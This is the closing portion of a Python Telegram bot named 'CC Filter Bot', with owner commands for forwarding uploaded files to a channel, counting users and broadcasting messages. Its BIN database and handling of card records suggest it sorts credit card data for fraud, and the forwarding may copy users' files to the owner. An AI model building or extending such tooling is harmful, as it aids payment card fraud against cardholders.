        current = get_sux_forward_chat()
        if current:
            await event.reply(
                f"Forward channel: `{current}`\n"
                f"Usage: `/sux <channel_id>` or `/sux off`",
                parse_mode="md",
            )
        else:
            await event.reply(
                "Usage: `/sux <channel_id>`\n"
                "Example: `/sux -1001234567890`\n"
                "Disable: `/sux off`",
                parse_mode="md",
            )
        return

    arg = arg.strip()
    if arg.lower() in ("off", "0", "disable", "none"):
        save_sux_forward_chat(None)
        await event.reply("✅ File forwarding disabled.")
        return

    try:
        chat_id = int(arg)
    except ValueError:
        await event.reply("❌ Invalid channel id. Use numeric id e.g. `-1001234567890`")
        return

    save_sux_forward_chat(chat_id)
    await event.reply(f"✅ Files will forward to `{chat_id}`", parse_mode="md")


@bot.on(events.NewMessage(pattern="/users"))
async def users_handler(event):
    if not is_owner(event.sender_id):
        return
    users = load_users()
    await event.reply(f"👥 Total users: {len(users)}")


@bot.on(events.NewMessage(pattern=r"/broadcast(?:\s+(.+))?"))
async def broadcast_handler(event):
    if not is_owner(event.sender_id):
        return
    msg = event.pattern_match.group(1)
    if not msg:
        await event.reply("Usage: `/broadcast your message`", parse_mode="md")
        return
    users = load_users()
    ok = fail = 0
    for uid in users:
        try:
            await bot.send_message(uid, f"📢 **Broadcast**\n\n{msg}", parse_mode="md")
            ok += 1
        except Exception:
            fail += 1
    await event.reply(f"✅ Sent: {ok} | Failed: {fail} | Total: {len(users)}")


def main():
    os.makedirs(SESSIONS_DIR, exist_ok=True)
    tune = auto_tune_runtime_settings()
    bot.start(bot_token=BOT_TOKEN)
    print("🤖 CC Filter Bot running")
    print(f"👑 Owners: {', '.join(str(o) for o in sorted(OWNER_IDS))}")
    sux_chat = get_sux_forward_chat()
    if sux_chat:
        print(f"📤 Sux forward: {sux_chat}")
    print(f"📚 BIN DB: {BINS_FILE}")
    print(
        f"⚙️ Auto-tuned ({tune['tier']}): "
        f"{tune['total_mb']}MB total, {tune['avail_mb']}MB free, {tune['cpu']} CPU"
    )
    print(
        f"⚡ Parallel at ≥{tune['parallel_at']} records | "
        f"{tune['workers']} workers | batch {tune['batch']}"
    )
    print(f"📄 /f text if ≤{TEXT_OUTPUT_LIMIT} cards, else file")
    print(f"📦 Max input file size: {MAX_FILE_BYTES // (1024 * 1024)} MB")
    bot.run_until_disconnected()
    global _process_pool
    if _process_pool is not None:
        _process_pool.shutdown(wait=False)


if __name__ == "__main__":
    main()
